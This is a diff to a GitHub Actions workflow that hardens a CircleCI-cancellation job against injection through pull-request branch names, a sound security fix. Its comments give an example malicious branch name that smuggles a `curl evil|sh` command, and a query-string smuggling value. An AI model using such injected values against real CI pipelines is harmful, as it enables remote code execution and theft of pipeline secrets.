@@ -18,20 +18,32 @@ jobs:
       - name: Cancel running CircleCI workflows for this PR's branch
         env:
           CIRCLE_TOKEN: ${{ secrets.CIRCLECI_TOKEN }}
+          # Pass attacker-controllable values (the PR head branch name is chosen by
+          # whoever opens the PR) as real environment variables. GitHub injects these
+          # at runtime rather than substituting them textually into the script, so a
+          # branch named e.g. `x";curl evil|sh;"` cannot break out and run commands.
+          # Never interpolate github.event.* into a run: block with ${{ }}.
+          BRANCH: ${{ github.event.pull_request.head.ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          PR_MERGED: ${{ github.event.pull_request.merged }}
         run: |
-          BRANCH="${{ github.event.pull_request.head.ref }}"
           # Defensive: never act on the integration branches (a PR head should
           # never be one of these, but make it impossible to cancel their CI).
           if [ -z "$BRANCH" ] || [ "$BRANCH" = "master" ] || [ "$BRANCH" = "production" ]; then
             echo "No cancellable head branch ('$BRANCH') - skipping"
             exit 0
           fi
-          echo "PR #${{ github.event.pull_request.number }} closed (merged=${{ github.event.pull_request.merged }}); cancelling stray CI on branch: $BRANCH"
+          echo "PR #${PR_NUMBER} closed (merged=${PR_MERGED}); cancelling stray CI on branch: $BRANCH"
 
           # Use -s (not -sf) so a transient API error doesn't fail the job; a
           # missed cancel just leaves one workflow running, same as before.
-          PIPELINES=$(curl -s -H "Circle-Token: $CIRCLE_TOKEN" \
-            "https://circleci.com/api/v2/project/gh/Freegle/Iznik/pipeline?branch=${BRANCH}" 2>/dev/null || echo "")
+          # URL-encode the branch name (-G + --data-urlencode) so it is a single
+          # query value: a branch name is legally allowed to contain & and =, which
+          # raw interpolation would let smuggle in extra query params (e.g.
+          # branch=x&branch=master) and defeat the master/production guard above.
+          PIPELINES=$(curl -s -G -H "Circle-Token: $CIRCLE_TOKEN" \
+            --data-urlencode "branch=$BRANCH" \
+            "https://circleci.com/api/v2/project/gh/Freegle/Iznik/pipeline" 2>/dev/null || echo "")
 
           # Most-recent few pipelines for the branch (covers superseded pushes).
           IDS=$(echo "$PIPELINES" | jq -r '.items[0:5][].id // empty' 2>/dev/null || echo "")
